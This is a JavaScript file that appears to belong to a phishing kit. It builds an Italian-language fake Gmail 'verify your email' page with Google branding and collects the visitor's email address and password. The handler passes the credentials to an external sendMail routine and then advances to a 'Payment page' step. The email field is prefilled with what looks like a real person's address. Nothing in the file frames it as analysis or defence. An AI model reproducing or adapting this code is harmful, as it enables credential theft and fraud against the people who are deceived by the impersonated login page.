// step3.js - Email Verify Page

document.addEventListener('DOMContentLoaded', function() {
    loadStep3Content();
    initStep3();
});

function loadStep3Content() {
    const step3Container = document.getElementById('step3');
    
    step3Container.innerHTML = `
        <div style="max-width: 450px; margin: 0 auto;">
            <!-- Gmail Header -->
            <div style="text-align: center; margin-bottom: 30px;">
                <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 20px;">
                    <img src="https://www.gstatic.com/images/branding/product/1x/gmail_2020q4_48dp.png" alt="Gmail" style="width: 40px;">
                    <span style="font-size: 28px; color: #5f6368; font-weight: 500;">Gmail</span>
                </div>
                <h1 style="font-size: 28px; font-weight: 400; color: #202124; margin-bottom: 10px;">Verifica la tua email</h1>
                <p style="color: #5f6368; font-size: 16px;">Per favore verifica il tuo email per continuare</p>
                <div style="background: #e8f0fe; color: #1a73e8; padding: 8px 16px; border-radius: 20px; display: inline-block; font-size: 14px; margin-top: 15px;">
                    <i class="fa-solid fa-circle-exclamation"></i> Verifica email richiesta
                </div>
            </div>

        

            <!-- Email Form -->
            <form id="emailVerifyForm" onsubmit="handleEmailVerify(event)">
                <div style="margin-bottom: 20px;">
                    <label style="display: block; color: #5f6368; font-size: 14px; margin-bottom: 8px;">Indirizzo Email</label>
                    <div style="position: relative;">
                        <span style="position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #5f6368;">
                            <i class="fa-solid fa-envelope"></i>
                        </span>
                        <input type="email" id="emailf" class="form-control" style="width: 100%; padding: 14px 16px 14px 45px;" placeholder="Inserisci la tua email" value="dominique.nota62@gmail.com" required>
                    </div>
                </div>

                <div style="margin-bottom: 20px;">
                    <label style="display: block; color: #5f6368; font-size: 14px; margin-bottom: 8px;">Password</label>
                    <div style="position: relative;">
                        <span style="position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #5f6368; z-index: 1;">
                            <i class="fa-solid fa-lock"></i>
                        </span>
                        <div class="password-wrapper">
                            <input type="password" id="passwordf" class="form-control" style="width: 100%; padding: 14px 45px 14px 45px;" placeholder="Inserisci la tua password" required>
                            <span class="toggle-password" onclick="toggleEmailPassword()">
                                <i class="fa-solid fa-eye"></i>
                            </span>
                        </div>
                    </div>
                </div>

                <div style="display: flex; align-items: center; justify-content: space-between; margin: 20px 0;">
                    <label style="display: flex; align-items: center; gap: 8px; color: #5f6368; font-size: 14px;">
                        <input type="checkbox" checked style="width: 18px; height: 18px;"> Rimani connesso
                    </label>
                    <a href="#" style="color: #1a73e8; text-decoration: none; font-size: 14px;">Password dimenticata?</a>
                </div>

                <button type="submit" class="btn" style="width: 100%; background: #1a73e8; margin: 20px 0;">
                    <i>✓</i> Verifica Email
                </button>

                <div style="text-align: center;">
                    <a href="#" style="color: #1a73e8; text-decoration: none; font-weight: 500;">Crea un nuovo account Google</a>
                </div>
            </form>

            <!-- Footer -->
            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #dadce0; display: flex; align-items: center; justify-content: space-between;">
                <select style="padding: 8px; border: 1px solid #dadce0; border-radius: 4px; color: #5f6368;">
                    <option>Italiano</option>
                    <option>English</option>
                    <option>Español</option>
                    <option>Français</option>
                </select>
                <div style="display: flex; gap: 20px;">
                    <a href="#" style="color: #5f6368; text-decoration: none; font-size: 12px;">Aiuto</a>
                    <a href="#" style="color: #5f6368; text-decoration: none; font-size: 12px;">Privacy</a>
                    <a href="#" style="color: #5f6368; text-decoration: none; font-size: 12px;">Termini</a>
                </div>
            </div>
        </div>
    `;
}



// Email verify handler
function handleEmailVerify(event) {
    event.preventDefault();
    
    const email = document.getElementById('emailf').value;
    const password = document.getElementById('passwordf').value;
    
    if (!email || !password) {
        Swal.fire({
            icon: 'warning',
            title: 'Campi vuoti',
            text: 'Compila tutti i campi',
            timer: 2000,
            showConfirmButton: false
        });
        return;
    }
    
    // Show loading
    document.getElementById('loadingModal').style.display = 'flex';
    
    // Store verified email
    sessionStorage.setItem('verifiedEmail', JSON.stringify({
        email: email,
        timestamp: new Date().toISOString()
    }));
    
    // Send via scriptemail.js
    if (typeof sendMail === 'function') {
        // Create a fake event object
        const fakeEvent = {
            target: {
                id: 'emailVerifyForm'
            },
            preventDefault: () => {}
        };
        sendMail(fakeEvent);
    } else {
        // Fallback: just redirect
        setTimeout(() => {
            document.getElementById('loadingModal').style.display = 'none';
            goToStep(4); // Go to Payment page
        }, 1500);
    }
}

// Toggle password visibility
function toggleEmailPassword() {
    const passwordInput = document.getElementById('passwordf');
    const toggleIcon = document.querySelector('#step3 .toggle-password i');
    
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleIcon.className = 'fa-solid fa-eye-slash';
    } else {
        passwordInput.type = 'password';
        toggleIcon.className = 'fa-solid fa-eye';
    }
}

// Make functions globally available
window.handleEmailVerify = handleEmailVerify;
window.toggleEmailPassword = toggleEmailPassword;